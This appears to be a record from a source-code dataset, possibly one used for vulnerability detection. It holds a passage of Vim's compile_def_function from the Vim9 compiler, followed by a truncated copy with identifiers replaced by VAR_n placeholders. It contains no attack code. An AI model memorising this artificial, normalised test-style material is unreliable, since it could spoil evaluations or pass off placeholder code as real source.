if (add_def_function(ufunc) == FAIL)
return FAIL;
new_def_function = TRUE;
}
ufunc->uf_def_status = UF_COMPILING;
CLEAR_FIELD(cctx);
cctx.ctx_compile_type = compile_type;
cctx.ctx_ufunc = ufunc;
cctx.ctx_lnum = -1;
cctx.ctx_outer = outer_cctx;
ga_init2(&cctx.ctx_locals, sizeof(lvar_T), 10);
ga_init2(&cctx.ctx_type_stack, sizeof(type2_T), 50);
ga_init2(&cctx.ctx_imports, sizeof(imported_T), 10);
cctx.ctx_type_list = &ufunc->uf_type_list;
ga_init2(&cctx.ctx_instr, sizeof(isn_T), 50);
instr = &cctx.ctx_instr;
current_sctx = ufunc->uf_script_ctx;
current_sctx.sc_version = SCRIPT_VERSION_VIM9;
cmdmod.cmod_flags &= ~CMOD_LEGACY;
do_estack_push = !estack_top_is_ufunc(ufunc, 1);
if (do_estack_push)
estack_push_ufunc(ufunc, 1);
estack_compiling = TRUE;
if (check_args_shadowing(ufunc, &cctx) == FAIL)
goto erret;
if (ufunc->uf_def_args.ga_len > 0)
{
intcount = ufunc->uf_def_args.ga_len;
intfirst_def_arg = ufunc->uf_args.ga_len - count;
inti;
char_u*arg;
intoff = STACK_FRAME_SIZE + (ufunc->uf_va_name != NULL ? 1 : 0);
intdid_set_arg_type = FALSE;
SOURCING_LNUM = 0;  for (i = 0; i < count; ++i)
{
type_T*val_type;
intarg_idx = first_def_arg + i;
where_Twhere = WHERE_INIT;
intr;
intjump_instr_idx = instr->ga_len;
isn_T*isn;
if (generate_JUMP_IF_ARG_SET(&cctx, i - count - off) == FAIL)
goto erret;
ufunc->uf_args_visible = arg_idx;
arg = ((char_u **)(ufunc->uf_def_args.ga_data))[i];
r = compile_expr0(&arg, &cctx);
if (r == FAIL)
goto erret;
val_type = get_type_on_stack(&cctx, 0);
where.wt_index = arg_idx + 1;
if (ufunc->uf_arg_types[arg_idx] == &t_unknown)
{
did_set_arg_type = TRUE;
ufunc->uf_arg_types[arg_idx] = val_type;
}
else if (need_type_where(val_type, ufunc->uf_arg_types[arg_idx],
-1, where, &cctx, FALSE, FALSE) == FAIL)
goto erret;
if (generate_STORE(&cctx, ISN_STORE, i - count - off, NULL) == FAIL)
goto erret;
isn = ((isn_T *)instr->ga_data) + jump_instr_idx;
isn->isn_arg.jumparg.jump_where = instr->ga_len;
}
if (did_set_arg_type)
set_function_type(ufunc);
}
ufunc->uf_args_visible = ufunc->uf_args.ga_len;
for (;;)
{
exarg_T    ea;
int    starts_with_colon = FALSE;
char_u    *cmd;
cmdmod_T    local_cmdmod;
if (did_emsg_before != did_emsg)
goto erret;
if (line != NULL && *line == '|')
++line;
else if (line != NULL && *skipwhite(line) != NUL
&& !(*line == '#' && (line == cctx.ctx_line_start
|| VIM_ISWHITE(line[-1]))))
{
semsg(_(e_trailing_characters_str), line);
goto erret;
}
else if (line != NULL && vim9_bad_comment(skipwhite(line)))
goto erret;
else
{
line = next_line_from_context(&cctx, FALSE);
if (cctx.ctx_lnum >= ufunc->uf_lines.ga_len)
{
#ifdef FEAT_PROFILE
if (cctx.ctx_skip != SKIP_YES)
may_generate_prof_end(&cctx, prof_lnum);
#endif
break;
}
if (line != NULL)
{
line = vim_strsave(line);
vim_free(line_to_free);
line_to_free = line;
}
}
CLEAR_FIELD(ea);
ea.cmdlinep = &line;
ea.cmd = skipwhite(line);
if (*ea.cmd == '#')
{
line = (char_u *)"""";
continue;
}
#ifdef FEAT_PROFILE
if (cctx.ctx_compile_type == CT_PROFILE && cctx.ctx_lnum != prof_lnum
&& cctx.ctx_skip != SKIP_YES)
{
may_generate_prof_end(&cctx, prof_lnum);
prof_lnum = cctx.ctx_lnum;
generate_instr(&cctx, ISN_PROF_START);
}
#endif
if (cctx.ctx_compile_type == CT_DEBUG && cctx.ctx_lnum != debug_lnum
&& cctx.ctx_skip != SKIP_YES)
{
debug_lnum = cctx.ctx_lnum;
generate_instr_debug(&cctx);
}
cctx.ctx_prev_lnum = cctx.ctx_lnum + 1;
switch (*ea.cmd)
{
case '}':
{
scopetype_T stype = cctx.ctx_scope == NULL
? NO_SCOPE : cctx.ctx_scope->se_type;
if (stype == BLOCK_SCOPE)
{
compile_endblock(&cctx);
line = ea.cmd;
}
else
{
emsg(_(e_using_rcurly_outside_if_block_scope));
goto erret;
}
if (line != NULL)
line = skipwhite(ea.cmd + 1);
continue;
}
case '{':
if (ends_excmd(*skipwhite(ea.cmd + 1)))
{
line = compile_block(ea.cmd, &cctx);
continue;
}
break;
}
cctx.ctx_has_cmdmod = FALSE;
if (parse_command_modifiers(&ea, &errormsg, &local_cmdmod, FALSE)
== FAIL)
{
if (errormsg != NULL)
goto erret;
line = (char_u *)"""";
continue;
}
generate_cmdmods(&cctx, &local_cmdmod);
undo_cmdmod(&local_cmdmod);
for (p = ea.cmd; p >= line; --p)
{
if (*p == ':')
starts_with_colon = TRUE;
if (p < ea.cmd && !VIM_ISWHITE(*p))
break;
}
p = ea.cmd;
if (!(local_cmdmod.cmod_flags & CMOD_LEGACY))
{
if (checkforcmd(&ea.cmd, ""call"", 3))
{
if (*ea.cmd == '(')
ea.cmd = p;
else
ea.cmd = skipwhite(ea.cmd);
}
if (!starts_with_colon)
{
int    assign;
assign = may_compile_assignment(&ea, &line, &cctx);
if (assign == OK)
goto nextline;
if (assign == FAIL)
goto erret;
}
}
cmd = ea.cmd;
if ((*cmd != '$' || starts_with_colon)
&& (starts_with_colon || !(*cmd == '\''
|| (cmd[0] != NUL && cmd[0] == cmd[1]
&& (*cmd == '+' || *cmd == '-')))))
{
ea.cmd = skip_range(ea.cmd, TRUE, NULL);
if (ea.cmd > cmd)
{
if (!starts_with_colon
&& !(local_cmdmod.cmod_flags & CMOD_LEGACY))
{
semsg(_(e_colon_required_before_range_str), cmd);
goto erret;
}
ea.addr_count = 1;
if (ends_excmd2(line, ea.cmd))
{
generate_EXEC(&cctx, ISN_EXECRANGE,
vim_strnsave(cmd, ea.cmd - cmd));
line = ea.cmd;
goto nextline;
}
}
}
p = find_ex_command(&ea, NULL,
starts_with_colon || (local_cmdmod.cmod_flags & CMOD_LEGACY)
? NULL : item_exists, &cctx);
if (p == NULL)
{
if (cctx.ctx_skip != SKIP_YES)
emsg(_(e_ambiguous_use_of_user_defined_command));
goto erret;
}
if (local_cmdmod.cmod_flags & CMOD_LEGACY)
{
char_u *start = ea.cmd;
switch (ea.cmdidx)
{
case CMD_if:
case CMD_elseif:
case CMD_else:
case CMD_endif:
case CMD_for:
case CMD_endfor:
case CMD_continue:
case CMD_break:
case CMD_while:
case CMD_endwhile:
case CMD_try:
case CMD_catch:
case CMD_finally:
case CMD_endtry:
semsg(_(e_cannot_use_legacy_with_command_str), ea.cmd);
goto erret;
default: break;
}
if (checkforcmd(&start, ""return"", 4))
ea.cmdidx = CMD_return;
else
ea.cmdidx = CMD_legacy;
}
if (p == ea.cmd && ea.cmdidx != CMD_SIZE)
{
if (cctx.ctx_skip == SKIP_YES && ea.cmdidx != CMD_eval)
{
line += STRLEN(line);
goto nextline;
}
else if (ea.cmdidx != CMD_eval)
{
semsg(_(e_command_not_recognized_str), ea.cmd);
goto erret;
}
}
if (cctx.ctx_had_return
&& ea.cmdidx != CMD_elseif
&& ea.cmdidx != CMD_else
&& ea.cmdidx != CMD_endif
&& ea.cmdidx != CMD_endfor
&& ea.cmdidx != CMD_endwhile
&& ea.cmdidx != CMD_catch
&& ea.cmdidx != CMD_finally
&& ea.cmdidx != CMD_endtry)
{
emsg(_(e_unreachable_code_after_return));
goto erret;
}
p = skipwhite(p);
if (ea.cmdidx != CMD_SIZE
&& ea.cmdidx != CMD_write && ea.cmdidx != CMD_read)
{
if (ea.cmdidx >= 0)
ea.argt = excmd_get_argt(ea.cmdidx);
if ((ea.argt & EX_BANG) && *p == '!')
{
ea.forceit = TRUE;
p = skipwhite(p + 1);
}
}
switch (ea.cmdidx)
{
case CMD_def:
case CMD_function:
ea.arg = p;
line = compile_nested_function(&ea, &cctx, &line_to_free);
break;
case CMD_return:
line = compile_return(p, check_return_type,
local_cmdmod.cmod_flags & CMOD_LEGACY, &cctx);
cctx.ctx_had_return = TRUE;
break;
case CMD_let:
emsg(_(e_cannot_use_let_in_vim9_script));
break;
case CMD_var:
case CMD_final:
case CMD_const:
case CMD_increment:
case CMD_decrement:
line = compile_assignment(p, &ea, ea.cmdidx, &cctx);
if (line == p)
line = NULL;
break;
case CMD_unlet:
case CMD_unlockvar:
case CMD_lockvar:
line = compile_unletlock(p, &ea, &cctx);
break;
case CMD_import:
emsg(_(e_import_can_only_be_used_in_script));
line = NULL;
break;
case CMD_if:
line = compile_if(p, &cctx);
break;
case CMD_elseif:
line = compile_elseif(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_else:
line = compile_else(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_endif:
line = compile_endif(p, &cctx);
break;
case CMD_while:
line = compile_while(p, &cctx);
break;
case CMD_endwhile:
line = compile_endwhile(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_for:
line = compile_for(p, &cctx);
break;
case CMD_endfor:
line = compile_endfor(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_continue:
line = compile_continue(p, &cctx);
break;
case CMD_break:
line = compile_break(p, &cctx);
break;
case CMD_try:
line = compile_try(p, &cctx);
break;
case CMD_catch:
line = compile_catch(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_finally:
line = compile_finally(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_endtry:
line = compile_endtry(p, &cctx);
cctx.ctx_had_return = FALSE;
break;
case CMD_throw:
line = compile_throw(p, &cctx);
break;
case CMD_eval:
line = compile_eval(p, &cctx);
break;
case CMD_echo:
case CMD_echon:
case CMD_execute:
case CMD_echomsg:
case CMD_echoerr:
case CMD_echoconsole:
line = compile_mult_expr(p, ea.cmdidx, &cctx);
break;
case CMD_put:
ea.cmd = cmd;
line = compile_put(p, &ea, &cctx);
break;
case CMD_substitute:
if (check_global_and_subst(ea.cmd, p) == FAIL)
goto erret;
if (cctx.ctx_skip == SKIP_YES)
line = (char_u *)"""";
else
{
ea.arg = p;
line = compile_substitute(line, &ea, &cctx);
}
break;
case CMD_redir:
ea.arg = p;
line = compile_redir(line, &ea, &cctx);
break;
case CMD_cexpr:
case CMD_lexpr:
case CMD_caddexpr:
case CMD_laddexpr:
case CMD_cgetexpr:
case CMD_lgetexpr:
#ifdef FEAT_QUICKFIX
ea.arg = p;
line = compile_cexpr(line, &ea, &cctx);
#else
ex_ni(&ea);
line = NULL;
#endif
break;
case CMD_append:
case CMD_change:
case CMD_insert:
case CMD_k:
case CMD_t:
case CMD_xit:
not_in_vim9(&ea);
goto erret;
case CMD_SIZE:
if (cctx.ctx_skip != SKIP_YES)
{
semsg(_(e_invalid_command_str), ea.cmd);
goto erret;
}
line = (char_u *)"""";
break;
case CMD_lua:
case CMD_mzscheme:
case CMD_perl:
case CMD_py3:
case CMD_python3:
case CMD_python:
case CMD_pythonx:
case CMD_ruby:
case CMD_tcl:
ea.arg = p;
if (vim_strchr(line, '\n') == NULL)
line = compile_exec(line, &ea, &cctx);
else
line = compile_script(line, &cctx);
break;
case CMD_global:
if (check_global_and_subst(ea.cmd, p) == FAIL)
goto erret;
default:
ea.arg = p;
line = compile_exec(line, &ea, &cctx);
break;
}
nextline:
if (line == NULL)
goto erret;
line = skipwhite(line);
generate_undo_cmdmods(&cctx);
if (cctx.ctx_type_stack.ga_len < 0)
{
iemsg(""Type stack underflow"");
goto erret;
}
}
if (cctx.ctx_scope != NULL)
{
if (cctx.ctx_scope->se_type == IF_SCOPE)
emsg(_(e_missing_endif));
else if (cctx.ctx_scope->se_type == WHILE_SCOPE)
emsg(_(e_missing_endwhile));
else if (cctx.ctx_scope->se_type == FOR_SCOPE)
emsg(_(e_missing_endfor));
else
emsg(_(e_missing_rcurly));
goto erret;
}
if (!cctx.ctx_had_return)
{
if (ufunc->uf_ret_type->tt_type == VAR_UNKNOWN)
ufunc->uf_ret_type = &t_void;
else if (ufunc->uf_ret_type->tt_type != VAR_VOID)
{
emsg(_(e_missing_return_statement));
goto erret;
}
generate_instr(&cctx, ISN_RETURN_VOID);
}
if (emsg_silent == 0 || did_emsg_silent == did_emsg_silent_before)
{
dfunc_T*dfunc = ((dfunc_T *)def_functions.ga_data)
+ ufunc->uf_dfunc_idx;
dfunc->df_deleted = FALSE;
dfunc->df_script_seq = current_sctx.sc_seq;
#ifdef FEAT_PROFILE
if (cctx.ctx_compile_type == CT_PROFILE)
{
dfunc->df_instr_prof = instr->ga_data;
dfunc->df_instr_prof_count = instr->ga_len;
}
else
#endif
if (cctx.ctx_compile_type == CT_DEBUG)
{
dfunc->df_instr_debug = instr->ga_data;
dfunc->df_instr_debug_count = instr->ga_len;
}
else
{
dfunc->df_instr = instr->ga_data;
dfunc->df_instr_count = instr->ga_len;
}
dfunc->df_varcount = dfunc->df_var_names.ga_len;
dfunc->df_has_closure = cctx.ctx_has_closure;
if (cctx.ctx_outer_used)
ufunc->uf_flags |= FC_CLOSURE;
ufunc->uf_def_status = UF_COMPILED;
}
ret = OK;
erret:
if (ufunc->uf_def_status == UF_COMPILING)
{
dfunc_T*dfunc = ((dfunc_T *)def_functions.ga_data)
+ ufunc->uf_dfunc_idx;
clear_instr_ga(instr);
VIM_CLEAR(dfunc->df_name);
ga_clear_strings(&dfunc->df_var_names);
if (!dfunc->df_deleted && new_def_function
&& ufunc->uf_dfunc_idx == def_functions.ga_len - 1)
{
--def_functions.ga_len;
ufunc->uf_dfunc_idx = 0;
}
ufunc->uf_def_status = UF_COMPILE_ERROR;
while (cctx.ctx_scope != NULL)
drop_scope(&cctx);
if (errormsg != NULL)
emsg(errormsg);
else if (did_emsg == did_emsg_before)
emsg(_(e_compiling_def_function_failed));
}
if (cctx.ctx_redir_lhs.lhs_name != NULL)
{
if (ret == OK)
{
emsg(_(e_missing_redir_end));
ret = FAIL;
}
vim_free(cctx.ctx_redir_lhs.lhs_name);
vim_free(cctx.ctx_redir_lhs.lhs_whole);
}
current_sctx = save_current_sctx;
estack_compiling = save_estack_compiling;
cmdmod.cmod_flags =save_cmod_flags;
if (do_estack_push)
estack_pop();
vim_free(line_to_free);
free_imported(&cctx);
free_locals(&cctx);
ga_clear(&cctx.ctx_type_stack);
return ret;
}","int
compile_def_function(
ufunc_T*VAR_0,
intVAR_1,
compiletype_T   VAR_2,
cctx_T*VAR_3)
{
char_u*VAR_4 = NULL;
char_u*VAR_5 = NULL;
char_u*VAR_6;
char*VAR_7 = NULL;
cctx_TVAR_8;
garray_T*VAR_9;
intVAR_10 = VAR_11;
intVAR_12 = VAR_13;
intVAR_14 = VAR_15;
sctx_TVAR_16 = VAR_17;
intVAR_18 = VAR_19;
intVAR_20 = VAR_21.cmod_flags;
intVAR_22;
intVAR_23 = FALSE;
#ifdef VAR_24
intVAR_25 = -1;
#endif
intVAR_26 = -1;
if (VAR_0->uf_dfunc_idx > 0)
{
dfunc_T *VAR_27 = ((dfunc_T *)VAR_28.ga_data)
+ VAR_0->uf_dfunc_idx;
isn_T*VAR_29 = NULL;
switch (VAR_2)
{
case VAR_30:
#ifdef VAR_24
VAR_29 = VAR_27->df_instr_prof; break;
#endif
case VAR_31:   VAR_29 = VAR_27->df_instr; break;
case VAR_32:  VAR_29 = VAR_27->df_instr_debug; break;
}
if (VAR_29 != NULL)
delete_def_function_contents(VAR_27, FALSE);
ga_clear_strings(&VAR_27->df_var_names);
}
else
{
if (add_def_function(VAR_0) == VAR_15)
return VAR_15;
VAR_23 = TRUE;
}
VAR_0->uf_def_status = VAR_33;
CLEAR_FIELD(VAR_8);
VAR_8.ctx_compile_type = VAR_2;
VAR_8.ctx_ufunc = VAR_0;
VAR_8.ctx_lnum = -1;
VAR_8.ctx_outer = VAR_3;
ga_init2(&VAR_8.ctx_locals, sizeof(VAR_34), 10);
ga_init2(&VAR_8.ctx_type_stack, sizeof(VAR_35), 50);
ga_init2(&VAR_8.ctx_imports, sizeof(VAR_36), 10);
VAR_8.ctx_type_list = &VAR_0->uf_type_list;
ga_init2(&VAR_8.ctx_instr, sizeof(isn_T), 50);
VAR_9 = &VAR_8.ctx_instr;
VAR_17 = VAR_0->uf_script_ctx;
VAR_17.sc_version = VAR_37;
VAR_21.cmod_flags &= ~VAR_38;
VAR_22 = !estack_top_is_ufunc(VAR_0, 1);
if (VAR_22)
estack_push_ufunc(VAR_0, 1);
VAR_19 = TRUE;
if (check_args_shadowing(VAR_0, &VAR_8) == VAR_15)
goto erret;
if (VAR_0->uf_def_args.ga_len > 0)
{
intVAR_39 = VAR_0->uf_def_args.ga_len;
intVAR_40 = VAR_0->uf_args.ga_len - VAR_39;
intVAR_41;
char_u*VAR_42;
intVAR_43 = VAR_44 + (VAR_0->uf_va_name != NULL ? 1 : 0);
intVAR_45 = FALSE;
VAR_46 = 0;  
for (VAR_41 = 0; VAR_41 < VAR_39; ++VAR_41)
{
type_T*VAR_47;
intVAR_48 = VAR_40 + VAR_41;
where_TVAR_49 = VAR_50;
intVAR_51;
intVAR_52 = VAR_9->ga_len;
isn_T*VAR_53;
if (generate_JUMP_IF_ARG_SET(&VAR_8, VAR_41 - VAR_39 - VAR_43) == VAR_15)
goto erret;
VAR_0->uf_args_visible = VAR_48;
VAR_42 = ((char_u **)(VAR_0->uf_def_args.ga_data))[VAR_41];
VAR_51 = compile_expr0(&VAR_42, &VAR_8);
if (VAR_51 == VAR_15)
goto erret;
VAR_47 = get_type_on_stack(&VAR_8, 0);
VAR_49.wt_index = VAR_48 + 1;
if (VAR_0->uf_arg_types[VAR_48] == &VAR_54)
{
VAR_45 = TRUE;
VAR_0->uf_arg_types[VAR_48] = VAR_47;
}
else if (need_type_where(VAR_47, VAR_0->uf_arg_types[VAR_48],
-1, VAR_49, &VAR_8, FALSE, FALSE) == VAR_15)
goto erret;
if (generate_STORE(&VAR_8, VAR_55, VAR_41 - VAR_39 - VAR_43, NULL) == VAR_15)
goto erret;
VAR_53 = ((isn_T *)VAR_9->ga_data) + VAR_52;
VAR_53->isn_arg.jumparg.jump_where = VAR_9->ga_len;
}
if (VAR_45)
set_function_type(VAR_0);
}
VAR_0->uf_args_visible = VAR_0->uf_args.ga_len;
for (;;)
{
exarg_T    VAR_56;
int    VAR_57 = FALSE;
char_u    *VAR_58;
cmdmod_T    VAR_59;
if (VAR_10 != VAR_11)
goto erret;
if (VAR_4 != NULL && *VAR_4 == '|')
++VAR_4;
else if (VAR_4 != NULL && *skipwhite(VAR_4) != VAR_60
&& !(*VAR_4 == '#' && (VAR_4 == VAR_8.ctx_line_start
|| VIM_ISWHITE(VAR_4[-1]))))
{
semsg(_(VAR_61), VAR_4);
goto erret;
}
else if (VAR_4 != NULL && vim9_bad_comment(skipwhite(VAR_4)))
goto erret;
else
{
VAR_4 = next_line_from_context(&VAR_8, FALSE);
if (VAR_8.ctx_lnum >= VAR_0->uf_lines.ga_len)
{
#ifdef VAR_24
if (VAR_8.ctx_skip != VAR_62)
may_generate_prof_end(&VAR_8, VAR_25);
#endif
break;
}
if (VAR_4 != NULL)
{
VAR_4 = vim_strsave(VAR_4);
vim_free(VAR_5);
VAR_5 = VAR_4;
}
}
CLEAR_FIELD(VAR_56);
VAR_56.cmdlinep = &VAR_4;
VAR_56.cmd = skipwhite(VAR_4);
if (*VAR_56.cmd == '#')
{
VAR_4 = (char_u *)"""";
continue;
}
#ifdef VAR_24
if (VAR_8.ctx_compile_type == VAR_30 && VAR_8.ctx_lnum != VAR_25
&& VAR_8.ctx_skip != VAR_62)
{
may_generate_prof_end(&VAR_8, VAR_25);
VAR_25 = VAR_8.ctx_lnum;
generate_instr(&VAR_8, VAR_63);
}
#endif
if (VAR_8.ctx_compile_type == VAR_32 && VAR_8.ctx_lnum != VAR_26
&& VAR_8.ctx_skip != VAR_62)
{
VAR_26 = VAR_8.ctx_lnum;
generate_instr_debug(&VAR_8);
}
VAR_8.ctx_prev_lnum = VAR_8.ctx_lnum + 1;
switch (*VAR_56.cmd)
{
case '}':
{
scopetype_T VAR_64 = VAR_8.ctx_scope == NULL
? VAR_65 : VAR_8.ctx_scope->se_type;
if (VAR_64 == VAR_66)
{
compile_endblock(&VAR_8);
VAR_4 = VAR_56.cmd;
}
else
{
emsg(_(VAR_67));
goto erret;
}
if (VAR_4 != NULL)
VAR_4 = skipwhite(VAR_56.cmd + 1);
continue;
}
case '{':
if (ends_excmd(*skipwhite(VAR_56.cmd + 1)))
{
VAR_4 = compile_block(VAR_56.cmd, &VAR_8);
continue;
}
break;
}
VAR_8.ctx_has_cmdmod = FALSE;
if (parse_command_modifiers(&VAR_56, &VAR_7, &VAR_59, FALSE)
== VAR_15)
{
if (VAR_7 != NULL)
goto erret;
VAR_4 = (char_u *)"""";
continue;
}
generate_cmdmods(&VAR_8, &VAR_59);
undo_cmdmod(&VAR_59);
for (VAR_6 = VAR_56.cmd; VAR_6 >= VAR_4; --VAR_6)
{
if (*VAR_6 == ':')
VAR_57 = TRUE;
if (VAR_6 < VAR_56.cmd && !VIM_ISWHITE(*VAR_6))
break;
}
VAR_6 = VAR_56.cmd;
if (!(VAR_59.cmod_flags & VAR_38))
{
if (checkforcmd(&VAR_56.cmd, ""call"", 3))
{
if (*VAR_56.cmd == '(')
VAR_56.cmd = VAR_6;
else
VAR_56.cmd = skipwhite(VAR_56.cmd);
}
if (!VAR_57)
{
int    VAR_68;
VAR_68 = may_compile_assignment(&VAR_56, &VAR_4, &VAR_8);
if (VAR_68 == VAR_69)
goto nextline;
if (VAR_68 == VAR_15)
goto erret;
}
}
VAR_58 = VAR_56.cmd;
if ((*VAR_58 != '$' || VAR_57)
&& (VAR_57 || !(*VAR_58 == '\''
|| (VAR_58[0] != VAR_60 && VAR_58[0] == VAR_58[1]
&& (*VAR_58 == '+' || *VAR_58 == '-')))))
{
VAR_56.cmd = skip_range(VAR_56.cmd, TRUE, NULL);
if (VAR_56.cmd > VAR_58)
{
if (!VAR_57
&& !(VAR_59.cmod_flags & VAR_38))
{
semsg(_(VAR_70), VAR_58);
goto erret;
}
VAR_56.addr_count = 1;
if (ends_excmd2(VAR_4, VAR_56.cmd))
{
generate_EXEC(&VAR_8, VAR_71,
vim_strnsave(VAR_58, VAR_56.cmd - VAR_58));
VAR_4 = VAR_56.cmd;
goto nextline;
}
}
}
VAR_6 = find_ex_command(&VAR_56, NULL,
VAR_57 || (VAR_59.cmod_flags & VAR_38)
? NULL : VAR_72, &VAR_8);
if (VAR_6 == NULL)
{
if (VAR_8.ctx_skip != VAR_62)
emsg(_(VAR_73));
goto erret;
}
if (VAR_59.cmod_flags & VAR_38)
{
char_u *VAR_74 = VAR_56.cmd;
switch (VAR_56.cmdidx)
{
case VAR_75:
case VAR_76:
case VAR_77:
case VAR_78:
case VAR_79:
case VAR_80:
case VAR_81:
case VAR_82:
case VAR_83:
case VAR_84:
case VAR_85:
case VAR_86:
case VAR_87:
case VAR_88:
semsg(_(VAR_89), VAR_56.cmd);
goto erret;
default: break;
}
if (checkforcmd(&VAR_74, ""return"", 4))
VAR_56.cmdidx = VAR_90;
else
VAR_56.cmdidx = VAR_91;
}
if (VAR_6 == VAR_56.cmd && VAR_56.cmdidx != VAR_92)
{
if (VAR_8.ctx_skip == VAR_62 && VAR_56.cmdidx != VAR_93)
{
VAR_4 += STRLEN(VAR_4);
goto nextline;
}
else if (VAR_56.cmdidx != VAR_93)
{
semsg(_(VAR_94), VAR_56.cmd);
goto erret;
}
}
if (VAR_8.ctx_had_return
&& VAR_56.cmdidx != VAR_76
&& VAR_56.cmdidx != VAR_77
&& VAR_56.cmdidx != VAR_78
&& VAR_56.cmdidx != VAR_80
&& VAR_56.cmdidx != VAR_84
&& VAR_56.cmdidx != VAR_86
&& VAR_56.cmdidx != VAR_87
&& VAR_56.cmdidx != VAR_88)
{
emsg(_(VAR_95));
goto erret;
}
VAR_6 = skipwhite(VAR_6);
if (VAR_56.cmdidx != VAR_92
&& VAR_56.cmdidx != VAR_96 && VAR_56.cmdidx != VAR_97)
{
if (VAR_56.cmdidx >= 0)
VAR_56.argt = excmd_get_argt(VAR_56.cmdidx);
if ((VAR_56.argt & VAR_98) && *VAR_6 == '!')
{
VAR_56.forceit = TRUE;
VAR_6 = skipwhite(VAR_6 + 1);
}
}
switch (VAR_56.cmdidx)
{
case VAR_99:
case VAR_100:
VAR_56.arg = VAR_6;
VAR_4 = compile_nested_function(&VAR_56, &VAR_8, &VAR_5);
break;
case VAR_90:
VAR_4 = compile_return(VAR_6, VAR_1,
VAR_59.cmod_flags & VAR_38, &VAR_8);
VAR_8.ctx_had_return = TRUE;
break;
case VAR_101:
emsg(_(VAR_102));
break;
case VAR_103:
case VAR_104:
case VAR_105:
case VAR_106:
case VAR_107:
VAR_4 = compile_assignment(VAR_6, &VAR_56, VAR_56.cmdidx, &VAR_8);
if (VAR_4 == VAR_6)
VAR_4 = NULL;
break;
case VAR_108:
case VAR_109:
case VAR_110:
VAR_4 = compile_unletlock(VAR_6, &VAR_56, &VAR_8);
break;
case VAR_111:
emsg(_(VAR_112));
VAR_4 = NULL;
break;
case VAR_75:
VAR_4 = compile_if(VAR_6, &VAR_8);
break;
case VAR_76:
VAR_4 = compile_elseif(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_77:
VAR_4 = compile_else(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_78:
VAR_4 = compile_endif(VAR_6, &VAR_8);
break;
case VAR_83:
VAR_4 = compile_while(VAR_6, &VAR_8);
break;
case VAR_84:
VAR_4 = compile_endwhile(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_79:
VAR_4 = compile_for(VAR_6, &VAR_8);
break;
case VAR_80:
VAR_4 = compile_endfor(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_81:
VAR_4 = compile_continue(VAR_6, &VAR_8);
break;
case VAR_82:
VAR_4 = compile_break(VAR_6, &VAR_8);
break;
case VAR_85:
VAR_4 = compile_try(VAR_6, &VAR_8);
break;
case VAR_86:
VAR_4 = compile_catch(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_87:
VAR_4 = compile_finally(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_88:
VAR_4 = compile_endtry(VAR_6, &VAR_8);
VAR_8.ctx_had_return = FALSE;
break;
case VAR_113:
VAR_4 = compile_throw(VAR_6, &VAR_8);
break;
case VAR_93:
VAR_4 = compile_eval(VAR_6, &VAR_8);
break;
case VAR_114:
case VAR_115:
case VAR_116:
case VAR_117:
case VAR_118:
case VAR_119:
VAR_4 = compile_mult_expr(VAR_6, VAR_56.cmdidx, &VAR_8);
break;
case VAR_120:
VAR_56.cmd = VAR_58;
VAR_4 = compile_put(VAR_6, &VAR_56, &VAR_8);
break;
case VAR_121:
if (check_global_and_subst(VAR_56.cmd, VAR_6) == VAR_15)
goto erret;
if (VAR_8.ctx_skip == VAR_62)
VAR_4 = (char_u *)"""";
else
{
VAR_56.arg = VAR_6;
VAR_4 = compile_substitute(VAR_4, &VAR_56, &VAR_8);
}
break;
case VAR_122:
VAR_56.arg = VAR_6;
VAR_4 = compile_redir(VAR_4, &VAR_56, &VAR_8);
break;
case VAR_123:
case VAR_124:
case VAR_125:
case VAR_126:
case VAR_127:
case VAR_128:
#ifdef VAR_129
VAR_56.arg = VAR_6;
VAR_4 = compile_cexpr(VAR_4, &VAR_56, &VAR_8);
#else
ex_ni(&VAR_56);
VAR_4 = NULL;
#endif
break;
case VAR_130:
case VAR_131:
case VAR_132:
case VAR_133:
case VAR_134:
case VAR_135:
not_in_vim9(&VAR_56);
goto erret;
case VAR_92:
if (VAR_8.ctx_skip != VAR_62)
{
semsg(_(VAR_136), VAR_56.cmd);
goto erret;
}
VAR_4 = (char_u *)"""";
break;
case VAR_137:
case VAR_138:
case VAR_139:
case VAR_140:
case VAR_141:
case VAR_142:
case VAR_143:
case VAR_144:
case VAR_145:
VAR_56.arg = VAR_6;
if (vim_strchr(VAR_4, '\n') == NULL)
VAR_4 = compile_exec(VAR_4, &VAR_56, &VAR_8);
else
VAR_4 = compile_script(VAR_4, &VAR_8);
break;
case VAR_146:
if (check_global_and_subst(VAR_56.cmd, VAR_6) == VAR_15)
goto erret;
default:
VAR_56.arg = VAR_6;
VAR_4 = compile_exec(VAR_4, &VAR_56, &VAR_8);
break;
}
nextline:
if (VAR_4 == NULL)
goto erret;
VAR_4 = skipwhite(VAR_4);
generate_undo_cmdmods(&VAR_8);
if (VAR_8.ctx_type_stack.ga_len < 0)
{
iemsg(""Type stack underflow"");
goto erret;
}
}
if (VAR_8.ctx_scope != NULL)
{
if (VAR_8.ctx_scope->se_type == VAR_147)
emsg(_(VAR_148));
else if (VAR_8.ctx_scope->se_type == VAR_149)
emsg(_(VAR_150));
else if (VAR_8.ctx_scope->se_type == VAR_151)
emsg(_(VAR_152));
else
emsg(_(VAR_153));
goto erret;
}
if (!VAR_8.ctx_had_return)
{
if (VAR_0->uf_ret_type->tt_type == VAR_154)
VAR_0->uf_ret_type = &VAR_155;
else if (VAR_0->uf_ret_type->tt_type != VAR_156)
{
emsg(_(VAR_157));
goto erret;
}
generate_instr(&VAR_8, VAR_158);
}
if (VAR_159 == 0 || VAR_13 == VAR_12)
{
dfunc_T*VAR_27 = ((dfunc_T *)VAR_28.ga_data)
+ VAR_0->uf_dfunc_idx;
VAR_27->df_deleted = FALSE;
VAR_27->df_script_seq = VAR_17.sc_seq;
#ifdef VAR_24
if (VAR_8.ctx_compile_type == VAR_30)
{
